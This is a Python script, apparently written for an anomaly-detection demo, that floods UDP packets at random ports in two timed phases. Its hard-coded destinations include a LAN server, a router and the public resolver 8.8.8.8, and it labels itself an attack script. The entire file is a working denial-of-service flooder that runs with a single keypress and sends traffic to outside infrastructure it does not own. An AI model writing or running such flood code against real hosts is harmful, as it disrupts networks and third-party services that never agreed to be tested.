
import socket
import threading
import time
import random

# ── Config ─────────────────────────────────────────────
DESTINATIONS = [
    "192.168.56.1",   # your server
    "100.120.11.125",     # router
    "8.8.8.8",
]

PHASES = [
    {
        "name": "PHASE 1 — Mild anomaly",
        "packet_size": 1500,
        "pps": 2000,
        "duration": 15,
    },
    {
        "name": "PHASE 2 — Heavy attack",
        "packet_size": 3600,
        "pps": 600,
        "duration": 25,
    }
]

_running = threading.Event()

# ── Flood function ─────────────────────────────────────
def flood(size, pps):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"X" * size
    delay = 1.0 / pps

    while _running.is_set():
        dst = random.choice(DESTINATIONS)
        port = random.randint(1024, 65535)

        try:
            sock.sendto(payload, (dst, port))
        except:
            pass

        time.sleep(delay)

# ── Phase runner ───────────────────────────────────────
def run_phase(phase):
    print(f"\n{'='*50}")
    print(phase["name"])
    print(f"Size: {phase['packet_size']} | Rate: {phase['pps']} pps")
    print(f"{'='*50}")

    _running.set()

    threads = []
    for _ in range(3):
        t = threading.Thread(
            target=flood,
            args=(phase["packet_size"], phase["pps"]//3),
            daemon=True
        )
        t.start()
        threads.append(t)

    time.sleep(phase["duration"])
    _running.clear()

    print("Phase complete...\n")
    time.sleep(5)

# ── Main ───────────────────────────────────────────────
print("\n=== SIMPLE ATTACK SCRIPT ===")
print("Generating traffic for anomaly detection demo")
input("Press ENTER to start...")

for phase in PHASES:
    run_phase(phase)

print("\nAttack finished")

